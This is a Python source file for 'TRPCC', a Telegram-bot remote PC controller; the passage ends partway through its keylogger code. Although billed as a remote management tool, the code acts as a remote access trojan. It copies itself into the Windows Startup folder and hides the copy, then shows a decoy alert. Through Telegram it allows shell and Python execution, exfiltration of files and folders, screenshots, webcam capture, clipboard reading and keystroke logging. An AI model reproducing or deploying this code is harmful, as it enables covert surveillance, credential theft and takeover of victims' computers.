# TRPCC Telegram Client.

# Aiogram & Asyncio.
from aiogram import Bot, Dispatcher

from aiogram.types import Message, BotCommand, FSInputFile

from aiogram.filters.command import Command

from aiogram.exceptions import TelegramUnauthorizedError

from asyncio import WindowsSelectorEventLoopPolicy, run, set_event_loop_policy

from functools import wraps

# Generic imports.
from random import randint

from time import time, sleep, strftime

from datetime import datetime

from string import ascii_letters, digits, punctuation

from unicodedata import category

from platform import platform, system, release, version, architecture, processor

from screeninfo import get_monitors

from getpass import getuser

from subprocess import getoutput, run as sp_run

from os import remove, rename, startfile, getcwd, sep

from os.path import exists, isfile, isdir

from glob import glob

from shutil import rmtree, make_archive, move as s_move, copy2

from socket import gethostname, gethostbyname, AF_INET

from getmac import get_mac_address

from uuid import getnode

from webbrowser import open as open_u

from keyboard import send, write, read_event

from mouse import click, move, RIGHT, LEFT, MIDDLE

from ctypes import windll

from threading import Thread

from rebooter import Rebooter

from pyscreeze import screenshot

from pymsgbox import alert, INFO, WARNING

from pyperclip import copy, paste

from playsound import playsound

from pywinctl import getActiveWindow, getWindowsWithTitle

from psutil import Process, process_iter, cpu_count, cpu_freq, virtual_memory, boot_time, net_if_addrs

from pyautogui import press as pg_press

from cv2 import VideoCapture, imwrite

# PYI Run-time (_MEIPASS).
import sys

# For unpacking data.
from json import load


# TRPCC Version.
TRPCC_VERSION = '2.0'

# Help & about message.
help_msg = '''<b>Generic commands</b>:
/start - Start bot.
/help - Get help.
/about - About TRPCC.

<b>System commands</b>:
/sysinfo - Get system information.
/netinfo - Get basic network information.
/syscom - Execute a command in the console and retrieve its output. May cause a TelegramBadRequest error if the output is too large.
/getpid - Get process PID.
/killproc - Kill a process by PID or name.
/openurl (URL) - Open URL in a browser.
/lockpc - Lock PC.

<b>Work with files</b>:
/insertfile (DIRECTORY) - Insert file into directory. After passing command you must send a file you'd like to insert.
/fetchfile (FILE) - Fetch file by path.
/fetchdir (DIRECTORY) - Fetch directory as ZIP.
/dir (DIRECTORY) - Fetch directory content. May cause a TelegramBadRequest error if the output is too large.
/exists (FILE/DIRECTORY) - Does file/directory exist.
/delete (FILE/DIRECTORY) - Delete file/directory.
/rename (FILE/DIRECTORY) (FILE/DIRECTORY) - Rename file/directory (old -> new).
/move (FILE/DIRECTORY) (FILE/DIRECTORY) - Move file/directory.
/startfile (FILE) - Start file.

<b>Hardware (keyboard, mouse, monitor)</b>:
/sendkeys (KEYS) - Press keys. Hotkeys and multiple key pressing at once supported: `alt+tab,win+space`.
/type (TEXT) - Type text.
/mousebutton (BUTTON) - Click mouse button. Buttons: 1 - Right, 2 - Left, 3 - Middle.
/setmousepos (X) (Y) - Set cursor position.
/enablemonitor - Enable monitor. Highly unstable.
/disablemonitor - Disable monitor. Highly unstable.

<b>KLX (Key Logging X)</b>:
/beginklx (KCDI) - Begin key logging.
/stopklx - End key logging and get results.

<b>Screenshots</b>:
/screenshot - Take a screenshot.

<b>Power</b>:
/shutdown - Shutdown PC.
/reboot - Reboot PC.

<b>Python</b>:
/evalpython (CODE(EXPRESSION)) - Evaluate Python expression. Can evaluate large code if written as one-liners.

<b>Time</b>:
/date - Get local PC date.

<b>Message Boxes</b>:
/msgbox [TITLE] [TEXT] - Show message box.

<b>Clipboard</b>:
/copy (TEXT) - Paste text to clipboard.
/glcc - Get latest copied content.

<b>Sounds</b>:
/playsound - Play sound from controller side. After passing command you must send a MP3/WAV file to play sound.
/playlocalsound (PATH) - Play sound from the client-side.

<b>Windows</b>:
/getactivewindow - Get active window name, title, HWND.
/closeactivewindow - Close active window.

<b>Volume</b>:
/upvolume (AMOUNT) - Increase volume.
/downvolume (AMOUNT) - Decrease volume.

<b>Webcamera</b>:
/webcamimage (INDEX) - Capture image from web camera. Indexes start from 0 and end when all available web cameras end.

<b>Bot commands</b>:
/login (PASSWORD) - Authenticate yourself if bot is locked.
/wsits - See who started the bot in the current session.
/alive - Is the client-side alive.
/unalive - Terminate the client-side process.
/cancelloads - Cancel all file loads. Use it to cancel file loads after using <i>/playsound</i>, or <i>/insertfile</i>.
'''

help2_msg = '''<b>Some generic things you need to know</b>:
<b>1.</b> Bot is designed to control only one PC. This means you can't share compiled TRPCC controller to various computers and control them using only one bot.
<b>2.</b> Use two dots together (..) when you want to insert space character in parameter when using following commands: <i>rename</i>, <i>move</i>, <i>msgbox</i>.
<b>3.</b> When you disable a monitor via <i>/disablemonitor</i> command, on some machines you are unable to enable it back because system is asleep and bot can't handle any incoming commands. Use this command with caution.
'''

about_msg = f'''TRPCC (Telegram Remote PC Controller) is a software for controlling PC remotely via Telegram bot. It includes robust features like file and directory management (insertion, fetching, deletion, renaming, and movement), execution of system commands, process management, and advanced key logging system. Users can also interact with hardware components such as the mouse, keyboard, webcam, and monitors, as well as capture screenshots and play or manage sounds, ETC!

The bot supports password protection for secure access. It is designed for seamless operation across platforms, providing flexibility for various tasks, whether automation, remote monitoring, or system management. With its comprehensive toolset, this bot offers an efficient way to handle a wide range of system operations remotely via Telegram.

<b><a href="https://github.com/xzripper/trpcc">TRPCC</a> {TRPCC_VERSION}</b> by <b><a href="https://github.com/xzripper">xzripper</a></b> (<b>@arcissea</b>).
'''

# BotCommand spawner utility.
def bot_command(command: str, description: str) -> BotCommand:
    return BotCommand(command=command, description=description)

# List of all available commands.
commands = [
    bot_command('/start', 'Start bot.'),
    bot_command('/help', 'Get all available commands.'),
    bot_command('/about', 'About TRPCC.'),
    bot_command('/sysinfo', 'Generic system information.'),
    bot_command('/netinfo', 'Generic network information.'),
    bot_command('/syscom', 'Execute a command in the console and retrieve its output.'),
    bot_command('/getpid', 'Get process PID.'),
    bot_command('/killproc', 'Kill a process by PID or name.'),
    bot_command('/openurl', 'Open URL in a browser.'),
    bot_command('/lockpc', 'Lock PC.'),
    bot_command('/insertfile', 'Insert file into directory.'),
    bot_command('/fetchfile', 'Fetch file from the client-side by path.'),
    bot_command('/fetchdir', 'Fetch directory.'),
    bot_command('/dir', 'Fetch files in directory.'),
    bot_command('/exists', 'Does the specified path exist?'),
    bot_command('/delete', 'Delete specified file/directory.'),
    bot_command('/rename', 'Rename file/directory.'),
    bot_command('/move', 'Move file/directory.'),
    bot_command('/startfile', 'Start file.'),
    bot_command('/sendkeys', 'Send keyboard keys.'),
    bot_command('/type', 'Type text.'),
    bot_command('/mousebutton', 'Click mouse button.'),
    bot_command('/setmousepos', 'Set cursor position.'),
    bot_command('/enablemonitor', 'Enable monitor.'),
    bot_command('/disablemonitor', 'Disable monitor.'),
    bot_command('/beginklx', 'Begin key logging.'),
    bot_command('/endklx', 'End key logging and get results.'),
    bot_command('/screenshot', 'Make a screenshot.'),
    bot_command('/shutdown', 'Shutdown PC.'),
    bot_command('/reboot', 'Reboot PC.'),
    bot_command('/evalpython', 'Evaluate Python code.'),
    bot_command('/date', 'Get PC date.'),
    bot_command('/copy', 'Paste text to clipboard.'),
    bot_command('/glcc', 'Get latest copied content.'),
    bot_command('/msgbox', 'Show message box.'),
    bot_command('/playsound', 'Play sound from controller side.'),
    bot_command('/playlocalsound', 'Play sound from the client-side.'),
    bot_command('/getactivewindow', 'Get active window.'),
    bot_command('/closeactivewindow', 'Close active window.'),
    bot_command('/upvolume', 'Increase volume.'),
    bot_command('/downvolume', 'Decrease volume.'),
    bot_command('/webcamimage', 'Capture image from web cam.'),
    bot_command('/login', 'Authenticate yourself if bot is locked.'),
    bot_command('/wsits', 'See who started the bot in the current session.'),
    bot_command('/alive', 'Is the client-side alive.'),
    bot_command('/unalive', 'Kill the client-side process.'),
    bot_command('/cancelloads', 'Cancel all files load.'),
]

# Error codes.
MEIPASS_DATA_MISSING_ERROR = '0x78776869' # NMDE-ORD
MEIPASS_DATA_CANT_LOAD_ERROR = '0x7768677669' # MDCLE-ORD
MEIPASS_DATA_UNSPECIFIED_TOKEN_ERROR = '0x7768858469' # MDUTE-ORD
MEIPASS_DATA_UNSPECIFIED_NAME_ERROR = '0x7768857869' # MDUNE-ORD
MEIPASS_DATA_KEYS_CORRUPTED_ERROR = '0x7768756769' # MDKCE-ORD
MEIPASS_DATA_INVALID_TOKEN_ERROR = '0x7768738469' # MDITE-ORD
MEIPASS_DATA_UNSUPPORTED_OS_ERROR = '0x776885798369' # MDUOSE-ORD

# Parse run-time information.
_meipass_botdata = f'{sys._MEIPASS}{sep}MEIPASS_DATA.json'

if not isfile(_meipass_botdata):
    alert(MEIPASS_DATA_MISSING_ERROR, 'Stranger', icon=WARNING)

    exit(1)

_meipass_botdata_json = None

with open(_meipass_botdata, 'r') as _nmde_json:
    try:
        _meipass_botdata_json = load(_nmde_json)
    except:
        alert(MEIPASS_DATA_CANT_LOAD_ERROR, 'Stranger', icon=WARNING)

        exit(1)

# Error handling.
try:
    _meipass_botdata_json['TOKEN']
    _meipass_botdata_json['NAME']
    _meipass_botdata_json['PASSWORD']
except:
    alert(MEIPASS_DATA_KEYS_CORRUPTED_ERROR, 'Stranger', icon=WARNING)

    exit(1)

if not _meipass_botdata_json['TOKEN']:
    alert(MEIPASS_DATA_UNSPECIFIED_TOKEN_ERROR, 'Stranger', icon=WARNING)

    exit(1)

if not _meipass_botdata_json['NAME']:
    alert(MEIPASS_DATA_UNSPECIFIED_NAME_ERROR, 'Stranger', icon=WARNING)

    exit(1)

# Final data.
_RT_B_TOKEN = str(_meipass_botdata_json['TOKEN'])
_RT_B_NAME = str(_meipass_botdata_json['NAME'])
_RT_B_PWD = str(_meipass_botdata_json['PASSWORD'])

# Add to startup and hide it.
_sys_ = system()[0].lower()

_first_time = False

if _sys_ == 'w':
    _startup_path = f'C:\\Users\\{getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'

    _first_time = getcwd() != _startup_path

    if _first_time:
        _s_move_dst = _startup_path + f'\\{_RT_B_NAME}.exe'

        copy2(f'./{_RT_B_NAME}.exe', _s_move_dst)

        sp_run(['attrib', '+H', _s_move_dst])

else:
    alert(MEIPASS_DATA_UNSUPPORTED_OS_ERROR, 'Stranger') # Do not quit.

# Log if started for the first time.
if _first_time:
    alert('Return code: 0', _RT_B_NAME.capitalize() + '.', icon=INFO) # Improvised....

# Update event loop policy if running on windows.
if system() == 'Windows':
    set_event_loop_policy(WindowsSelectorEventLoopPolicy())

# Initialize bot & dispatcher.
try:
    bot = Bot(_RT_B_TOKEN)
except TelegramUnauthorizedError:
    alert(MEIPASS_DATA_INVALID_TOKEN_ERROR, 'Stranger', icon=WARNING)

    exit(1)

dp = Dispatcher()

# States.
_bot_waits_for_audio = [False]
_bot_waits_for_file = [False]

_bot_waits_for_unaliving = [False]

_bot_klx_active = [False]

_bot_klx_active_since = [None]

_bot_klx_active_since_raw = [None]

_bot_klx_ckeys_strsafe_dyn = [None]

_bot_klx_fckeys_strsafe_dyn = [[]]

_bot_klx_lpt_dyn = [None]

_file_path = [None]

# Sets with users.
u_stb = set()
u_authenticated = set()

# Decorator for requiring authentication.
def authreq(f):
    @wraps(f)
    async def authreq_wrapper(msg, *args, **kwargs):
        if _RT_B_PWD:
            if msg.from_user.id not in u_authenticated:
                await msg.reply('🔐 Bot is locked. Use /login to authenticate.')

                return

        return await f(msg, *args, **kwargs)

    return authreq_wrapper

# Function for notifying user about an error.
async def error(exception: Exception, command: str, message: Message) -> None:
    await message.reply(f'💔❌ Failed to execute `{command}` command: `{str(exception.args)}` [{exception.__class__.__name__}]. 💥')

# Utility for spacing via two dots.
def spacing(string: str) -> str:
    return ' '.join(string.split('..'))

# Start handler.
@dp.message(Command('start'))
async def start(message: Message) -> None:
    u_stb.add((message.from_user.username, message.from_user.full_name))

    await bot.set_my_commands(commands)

    await bot.send_photo(message.from_user.id, 'https://github.com/xzripper/trpcc/blob/main/trpcc_t.png?raw=true', caption=f'🎩 TRPCC Activated.\n\n🏴 Client receiver online.\n🏴 Controller online.\n\n⬛ <i>{getuser()}</i>\'s time: <b>{strftime("%H:%M:%S")}</b>.\n\n{"🔒 Authentication required." if _RT_B_PWD else "🔓 Authentication is not required."}\n\n🃏 Type /help to see what you can do :)\n❔ Type /about to see what is TRPCC.', parse_mode='HTML')

# Help handler.
@dp.message(Command('help'))
async def help_(message: Message) -> None:
    await message.reply(help_msg, parse_mode='HTML')
    await message.answer(help2_msg, parse_mode='HTML')
    await message.answer(f'<b><a href="https://github.com/xzripper/trpcc">TRPCC</a> {TRPCC_VERSION}</b> by <b><a href="https://github.com/xzripper">xzripper</a></b> (<b>@arcissea</b>).', parse_mode='HTML')

# About handler.
@dp.message(Command('about'))
async def about(message: Message) -> None:
    await message.reply(about_msg, parse_mode='HTML')

# Generic system information.
@dp.message(Command('sysinfo'))
@authreq
async def sysinfo(message: Message) -> None:
    try:
        monitor = [_monitor for _monitor in get_monitors() if _monitor.is_primary][0]

        vmem = virtual_memory()

        info = f'''💻 Client generic system information:
<pre>Platform: {platform()}

PC Username: {getuser()}

System: {system()}
System release: {release()}
System version: {version()}
System bits: {architecture()[0]}
System processor: {processor()}

Boot time (since the epoch): {boot_time()}s

Memory:
    Total: {vmem.total // (1024 ** 2)}mb
    Used: {vmem.used // (1024 ** 2)}mb
    Free {vmem.free // (1024 ** 2)}mb

CPU cores (logical/physical): {cpu_count()}pcs/{cpu_count(False)}pcs
CPU frequency: {cpu_freq().current:.2f}MHz

Hardware address (HEX): {hex(getnode())}

Monitor information:
    X:{monitor.x} Y:{monitor.y}
    W:{monitor.width} WMM:{monitor.width_mm}
    H:{monitor.height} HMM:{monitor.height_mm}
    Name:{monitor.name} Primary:True

IP: {gethostbyname(gethostname())}</pre>'''

        await message.reply(info, parse_mode='HTML')
    except Exception as exception:
        await error(exception, 'sysinfo', message)

# Get basic network information.
@dp.message(Command('netinfo'))
@authreq
async def netinfo(message: Message) -> None:
    try:
        _nwl = '\n'

        host = gethostname()

        ip = gethostbyname(host)

        ninf = net_if_addrs()

        interfaces = []

        for interface, addreses in ninf.items():
            for address in addreses:
                if address.family == AF_INET:
                    interfaces.append(f'{interface}:\n    IP: {address.address}; Netmask: {address.netmask}')

        info = f'''💻☄ Client generic network information:
<pre>Hostname: {host}
Local IP: {ip}
MAC Address: {get_mac_address()}
Network interfaces (if_addrs):
{_nwl.join(interfaces)}</pre>'''

        await message.reply(info, parse_mode='HTML')
    except Exception as exception:
        await error(exception, 'netinfo', message)

# Pass command to console.
@dp.message(Command('syscom'))
@authreq
async def syscom(message: Message) -> None:
    try:
        args = message.text.split()

        if len(args) <= 1:
            await message.reply('⁉ /syscom [COMMAND] <- Missing command.')

            return

        await message.reply(f'👷‍♂️⚒ Executing command and getting output...')

        output = getoutput(' '.join(args[1:]))

        await message.reply(f'👨‍💻 Command output:\n<pre>{output}</pre>', parse_mode='HTML')
    except Exception as exception:
        await error(exception, 'syscom', message)

# Get process PID by name.
@dp.message(Command('getpid'))
@authreq
async def getpid(message: Message) -> None:
    try:
        args = message.text.split()

        if len(args) <= 1:
            await message.reply('⁉ /getpid [PNAME] <- Missing process name.')

            return

        for proc in process_iter(('name', )):
            if proc.info['name'] == args[1]:
                await message.reply(f'⚙🔢 PID: {proc.pid}')

                return

        await message.reply('⚙❌ Can\'t find process PID.')
    except Exception as exception:
        await error(exception, 'getpid', message)

# Kill a process by PID or name.
@dp.message(Command('killproc'))
@authreq
async def killproc(message: Message) -> None:
    try:
        args = message.text.split()

        if len(args) <= 1:
            await message.reply('⁉ /killproc [PID/NAME] <- Missing process PID/Name.')

            return

        target = args[1]

        if target.isdigit():
            try:
                Process(int(target)).kill()

                await message.reply('✅ Process killed by PID successfully!')
            except Exception as exception:
                await message.reply(f'❌😢 Can\'t kill process by its PID; Getting {exception.__class__.__name__}.')

        else:
            killed = False

            for proc in process_iter(('name', )):
                if proc.info['name'] == target:
                    try:
                        proc.kill()

                        killed = True
                    except Exception as exception:
                        await message.reply(f'❌😢 Can\'t kill process by its name; Getting {exception.__class__.__name__}.')

            if killed:
                await message.reply('✅ Process killed successfully!')

            else:
                await message.reply('❌ Failed to kill process.')
    except Exception as exception:
        await error(exception, 'killproc', message)

# Open URL in a browser.
@dp.message(Command('openurl'))
@authreq
async def openurl(message: Message) -> None:
    args = message.text.split()

    if len(args) <= 1:
        await message.reply('⁉ /openurl [URL] <- Missing URL.')

        return

    await message.reply('✅ Success!' if open_u(args[1]) else '❌ Failed!')

# Lock PC.
@dp.message(Command('lockpc'))
@authreq
async def lockpc(message: Message) -> None:
    csys = system()[0].lower()

    if csys == 'w':
        Thread(target=lambda: windll.user32.LockWorkStation()).start()

        await message.reply('✅ Signal to lock PC sent (Using <b>WinDLL</b>).', parse_mode='HTML')

    elif csys == 'l':
        await message.reply('🚧 Linux is not currently supported for this action.')

    elif csys == 'd':
        await message.reply('🚧 MacOS is not currently supported for this action.')

    else:
        await message.reply('📑❓ Unknown platform!')

# Insert file into directory.
@dp.message(Command('insertfile'))
@authreq
async def insertfile(message: Message) -> None:
    args = message.text.split()

    if len(args) <= 1:
        await message.reply('⁉ /insertfile [PATH] <- Missing path.')

        return

    _file_path[0] = ' '.join(args[1:])

    if not exists(_file_path[0]):
        await message.reply('❌ No specified path found.')

        return

    if _bot_waits_for_file[0]:
        await message.reply('❌ Already waiting for file..')

        return

    _bot_waits_for_file[0] = True

    await message.reply('❗ Send file.')

# Load file and insert it.
@dp.message(lambda message: message.document)
async def load_and_insert(message: Message) -> None: # Continuation of `insertfile`.
    try:
        if not _bot_waits_for_file[0]:
            await message.reply('❌ Don\'t need file at this moment..')

            return

        sep = '' if _file_path[0].endswith('\\') or _file_path[0].endswith('/') else '/'

        path = f'{_file_path[0]}{sep}{message.document.file_name}'

        await bot.download(message.document.file_id, path)

        _bot_waits_for_file[0] = False

        _file_path[0] = None

        await message.reply(f'✅ Inserted {message.document.file_name} in {path}.')
    except Exception as exception:
        await error(exception, 'insertfile', message)

# Fetch file from the client-side by its path.
@dp.message(Command('fetchfile'))
@authreq
async def fetchfile(message: Message) -> None:
    try:
        args = message.text.split()

        if len(args) <= 1:
            await message.reply('⁉ /fetchfile [PATH] <- Missing path.')

            return

        path = ' '.join(args[1:])

        if not exists(path):
            await message.reply('❌ Failed to find specified file by path.')

            return

        if not isfile(path):
            await message.reply('❌ Expected file.')

            return

        await message.reply('📩 Trying to fetch file...')

        _dl = '\\'

        if (ext := path.split('.')[-1]) in ('png', 'jpg', 'jpeg'):
            await message.reply_photo(FSInputFile(path), f'🖼 <b>{".".join(path.split(_dl)[-1].split(".")[0:-1])}</b> (<b>{ext.upper()}</b>).', parse_mode='HTML')

        else:
            await message.reply_document(FSInputFile(path), caption=f'📄 <b>{".".join(path.split(_dl)[-1].split(".")[0:-1])}</b> (<b>{path.split(".")[-1].upper()}</b>).', parse_mode='HTML')
    except Exception as exception:
        if 'non-empty' in str(exception):
            await message.reply(f'💥 TELEGRAM EXCEPTION: Can\'t send file: the file must not be empty.')

        else:
            await error(exception, 'fetchfile', message)

# Fetch directory from the client-side by path.
@dp.message(Command('fetchdir'))
@authreq
async def fetchdir(message: Message) -> None:
    try:
        args = message.text.split()

        if len(args) <= 1:
            await message.reply('⁉ /fetchdir [PATH] <- Missing path.')

            return

        path = ' '.join(args[1:])

        if not exists(path):
            await message.reply('❌ Failed to find specified file by its path.')

            return

        if not isdir(path):
            await message.reply('❌ Expected a directory.')

            return

        await message.reply('🔃 Making archive from folder (may take a few seconds).')

        make_archive('directory', 'zip', path)

        await message.reply_document(message.from_user.id, FSInputFile('directory.zip'), caption='zip archive todo re-design') # TODO: Re-design this!

        remove('directory.zip')
    except Exception as exception:
        await error(exception, 'fetchdir', message)

# Fetch files in directory.
@dp.message(Command('dir'))
@authreq
async def dir_(message: Message) -> None:
    try:
        args = message.text.split()

        if len(args) <= 1:
            await message.reply('⁉ /dir [PATH] <- Missing path.')

            return

        path = ' '.join(args[1:])

        if not exists(path):
            await message.reply('❌ Failed to find specified path.')

            return

        if not isdir(path):
            await message.reply('❌ Expected directory.')

            return

        files = glob(path + '/*', recursive=True)

        await message.reply(f'🌲 <b>{path}</b> tree:\n<pre>' + '\n'.join(files) + '</pre>', parse_mode='HTML')
    except Exception as exception:
        await error(exception, 'dir', message)

# Does the file exist.
@dp.message(Command('exists'))
@authreq
async def exists_(message: Message) -> None:
    try:
        args = message.text.split()

        if len(args) <= 1:
            await message.reply('⁉ /exists [PATH] <- Missing path.')

            return

        path = ' '.join(args[1:])

        await message.reply('✅ Exists.' if exists(path) else '❌ Nonexistent.')
    except Exception as exception:
        await error(exception, 'exists', message)

# Delete file/folder.
@dp.message(Command('delete'))
@authreq
async def delete(message: Message) -> None:
    try:
        args = message.text.split()

        if len(args) <= 1:
            await message.reply('⁉ /delete [PATH] <- Missing path.')

            return

        path = ' '.join(args[1:])

        if not exists(path):
            await message.reply('❌ Failed to find specified path.')

            return

        if isdir(path):
            rmtree(path)

        elif isfile(path):
            remove(path)

        await message.reply(f'✅ Attempt to delete `{path}` finished.')
    except Exception as exception:
        await error(exception, 'delete', message)

# Rename file/directory.
@dp.message(Command('rename'))
@authreq
async def rename_(message: Message) -> None:
    try:
        args = message.text.split()

        if len(args) <= 2:
            await message.reply('⁉ /rename [OLD] [NEW] <- Missing path.')

            return

        old, new = spacing(args[1]), spacing(args[2])

        if not exists(old):
            await message.reply('❌ Failed to find specified old path.')

            return

        rename(old, new)

        await message.reply(f'✅ Renamed `{old}` to `{new}`.')
    except Exception as exception:
        await error(exception, 'rename', message)

# Move file/directory.
@dp.message(Command('move'))
@authreq
async def move_(message: Message) -> None:
    try:
        args = message.text.split()

        if len(args) <= 2:
            await message.reply('⁉ /rename [OLD] [NEW] <- Missing path.')

            return

        old, new = spacing(args[1]), spacing(args[2])

        if not exists(old):
            await message.reply('❌ Failed to find specified old path.')

            return

        s_move(old, new)

        await message.reply(f'✅ Moved `{old}` to `{new}`.')
    except Exception as exception:
        await error(exception, 'move', message)

# Start file.
@dp.message(Command('startfile'))
@authreq
async def startfile_(message: Message) -> None:
    try:
        args = message.text.split()

        if len(args) <= 1:
            await message.reply('⁉ /startfile [PATH] <- Missing path.')

            return

        path = ' '.join(args[1:])

        if not exists(path):
            await message.reply('❌ Failed to find specified path.')

            return

        startfile(path)

        await message.reply(f'❓ Starting `{path}`.')
    except Exception as exception:
        await error(exception, 'startfile', message)

# Press keyboard keys.
@dp.message(Command('sendkeys'))
@authreq
async def sendkeys(message: Message) -> None:
    try:
        args = message.text.split()

        if len(args) <= 1:
            await message.reply('⁉ /sendkeys [KEYS] <- Missing keys.')

            return

        send(args[1])

        await message.reply(f'〽 Sending {args[1]}...')
    except Exception as exception:
        await error(exception, 'sendkeys', message)

# Type text.
@dp.message(Command('type'))
@authreq
async def type_(message: Message) -> None:
    try:
        args = message.text.split()

        if len(args) <= 1:
            await message.reply('⁉ /type [TEXT] <- Missing text.')

            return

        await message.reply(f'〽 Typing {" ".join(args[1:])}...')

        write(' '.join(args[1:]))
    except Exception as exception:
        await error(exception, 'type', message)

# Click mouse button.
@dp.message(Command('mousebutton'))
@authreq
async def mousebutton(message: Message) -> None:
    try:
        args = message.text.split()

        if len(args) <= 1:
            await message.reply('⁉ /mousebutton [BUTTON] <- Missing button.')

            return

        buttons = {'1': RIGHT, '2': LEFT, '3': MIDDLE}

        if args[1] in buttons:
            click(buttons[args[1]])

            await message.reply(f'✅ Clicked {buttons[args[1]]} button.')

        else:
            await message.reply(f'❌ Invalid button.')
    except Exception as exception:
        await error(exception, 'mousebutton', message)

# Click mouse button.
@dp.message(Command('setmousepos'))
@authreq
async def setmousepos(message: Message) -> None:
    try:
        args = message.text.split()

        if len(args) <= 2:
            await message.reply('⁉ /setmousepos [X] [Y] <- X and Y coordinates are required.')

            return

        if not args[1].isdigit() or not args[2].isdigit():
            await message.reply('❌ Coordinates must be numbers.')

            return

        move(int(args[1]), int(args[2]))

        await message.reply(f'✅ Moved cursor to {args[1]}, {args[2]}.')
    except Exception as exception:
        await error(exception, 'setmousepos', message)

# Enable monitor.
@dp.message(Command('enablemonitor'))
@authreq
async def enablemonitor(message: Message) -> None:
    try:
        csys = platform()[0].lower()

        if csys == 'w':
            Thread(target=lambda: windll.user32.SendMessageW(65535, 274, 61808, -1)).start()

            await message.reply('✅ Signal to enable monitor sent (Using <b>WinDLL</b>).', parse_mode='HTML')

        elif csys == 'l':
            await message.reply('🚧 Linux is not currently supported for this action.')

        elif csys == 'd':
            await message.reply('🚧 MacOS is not currently supported for this action.')

        else:
            await message.reply('📑❓ Unknown platform!')
    except Exception as exception:
        await error(exception, 'enablemonitor', message)

# Disable monitor.
@dp.message(Command('disablemonitor'))
@authreq
async def disablemonitor(message: Message) -> None:
    try:
        csys = platform()[0].lower()

        if csys == 'w':
            Thread(target=lambda: windll.user32.SendMessageW(65535, 274, 61808, 2)).start()

            await message.reply('✅ Signal to disable monitor sent (Using <b>WinDLL</b>).', parse_mode='HTML')

        elif csys == 'l':
            await message.reply('🚧 Linux is not currently supported for this action.')

        elif csys == 'd':
            await message.reply('🚧 MacOS is not currently supported for this action.')

        else:
            await message.reply('📑❓ Unknown platform!')
    except Exception as exception:
        await error(exception, 'disablemonitor', message)

# KLX-related functions.
def _klx_u_time():
    return datetime.now().strftime('%Y-%m-%d %H:%M:%S:%f')[:-4]

def _klx_u_valid_char(char):
    check_1 = char in (ascii_letters + digits + punctuation + ' ')

    check_2 = None

    try:
        check_2 = category(char).startswith(('L', 'N', 'P', 'S'))
    except:
        return check_1

    return check_1 or check_2

def _klx_log(message):
    return f'[KLX] ({_klx_u_time()}) in "{"".join([char for char in getActiveWindow().title if char in (ascii_letters + digits + punctuation + " ")]).strip()}" : {message}'

# Generic utilities.
def _u_timediff_funit(val, uname):
    return f'{val} {uname}{"s" if val > 1 else ""}' if val > 0 else None

def _u_timediff(initial, now):
    delta = now - initial

    y, _m, d = delta.days // 365, (delta.days % 365) // 30, delta.days % 30
    h, m, s = delta.seconds // 3600, (delta.seconds % 3600) // 60, delta.seconds % 60

    time_parts = filter(None, [
        _u_timediff_funit(y, 'Year'),
        _u_timediff_funit(_m, 'Month'),
        _u_timediff_funit(d, 'Day'),
        _u_timediff_funit(h, 'Hour'),
        _u_timediff_funit(m, 'Minute'),
        _u_timediff_funit(s, 'Second'),
    ])

    return ' '.join(time_parts) if time_parts else 'No time difference.'

# Begin key logging.
@dp.message(Command('beginklx'))
@authreq
async def beginklx(message: Message) -> None:
    if system() != 'Windows':
        await message.reply('😢⚙ Key Logging X supports only Windows. Sorry!')

        return

    if _bot_klx_active[0]:
        await message.reply('🤯 Key logging process is already active! Use /endklx to stop to begin new!')

        return

    args = message.text.split()

    if len(args) <= 1:
        await message.reply('⁉ /beginklx [KCDI] <- Missing key collection reset delay (from 1 to 60 seconds) or clipboard monitoring feature (Y/n).')

        return

    kcdi = args[1]

    if not kcdi.isdigit():
        await message.reply('🧩 KCDI must be an integer.')

        return

    kcdi = int(kcdi)

    if kcdi not in range(1, 61):
        await message.reply('🧮 KCDI must be in 1-60 range.')

        return

    _bot_klx_active[0] = True

    _bot_klx_active_since[0] = _klx_u_time()

    _bot_klx_active_since_raw[0] = datetime.now()

    await message.reply('💡⏳ Initializing KLX...')

    def _klx_process_2():
        while _bot_klx_active[0]:
            if time() - _bot_klx_lpt_dyn[0] > kcdi:
                if _bot_klx_ckeys_strsafe_dyn[0]:
                    _bot_klx_ckeys_strsafe_dyn[0] = ''

                    _bot_klx_fckeys_strsafe_dyn[0].append(_klx_log(f'KCDI:{kcdi}s delay...'))

            sleep(1)

    def _klx_process_1():
        if not _bot_klx_lpt_dyn[0]:
            _bot_klx_lpt_dyn[0] = time()

            sleep(0.1)

        while _bot_klx_active[0]:
            k_event = read_event()

            if k_event.event_type == 'down':
                if _bot_klx_ckeys_strsafe_dyn[0] == None:
                    _bot_klx_ckeys_strsafe_dyn[0] = ''

                char = k_event.name.replace('space', ' ')

                if char == 'enter':
                    _bot_klx_fckeys_strsafe_dyn[0].append(_klx_log('Enter pressed.'))

                    _bot_klx_lpt_dyn[0] = time()

                    continue

                if char in ('backspace', 'backspace ', 'back', 'back '): # In my case its 'back '; added more variants just in case. I have no idea what is wrong with backspace button.
                    _bot_klx_ckeys_strsafe_dyn[0] = _bot_klx_ckeys_strsafe_dyn[0][:-1]

                    _bot_klx_fckeys_strsafe_dyn[0].append(_klx_log('Backspace pressed.'))

                    _bot_klx_fckeys_strsafe_dyn[0].append(_klx_log(f"{_bot_klx_ckeys_strsafe_dyn[0]}"))

                    _bot_klx_lpt_dyn[0] = time()

                    continue

                if len(char) > 1:
                    _bot_klx_fckeys_strsafe_dyn[0].append(_klx_log(f"[NON-CHAR] {char.upper()}"))

                    continue

                if len(char) == 1 and _klx_u_valid_char(char):
                    _bot_klx_ckeys_strsafe_dyn[0] += char

                    _bot_klx_fckeys_strsafe_dyn[0].append(_klx_log(f"{_bot_klx_ckeys_strsafe_dyn[0]}"))

                    _bot_klx_lpt_dyn[0] = time()

    Thread(target=_klx_process_1).start()
    Thread(target=_klx_process_2).start()

    await message.reply('⚡ KLX running!')

# End key logging.
@dp.message(Command('endklx'))
@authreq
async def endklx(message: Message) -> None:
    if not _bot_klx_active[0]:
        await message.reply('🔌 KLX is not active! Use /beginklx to start KLX!')

        return

    _bot_klx_active[0] = False

    if not _bot_klx_fckeys_strsafe_dyn[0]:
        await message.reply('🗑 No keys registered!')

        return

    if f'KCDI:' in _bot_klx_fckeys_strsafe_dyn[0][-1]:
        _bot_klx_fckeys_strsafe_dyn[0].pop()

    _bot_klx_fckeys_strsafe_dyn[0].insert(0, f'[KLX] [WARNING] : Only Latin characters are displayed and supported, i.e Cyrillic or Chinese is displayed as a Latin characters.')

    _bot_klx_fckeys_strsafe_dyn[0].insert(1, f'[KLX] ({_bot_klx_active_since[0]}) : Listening mode activated.')

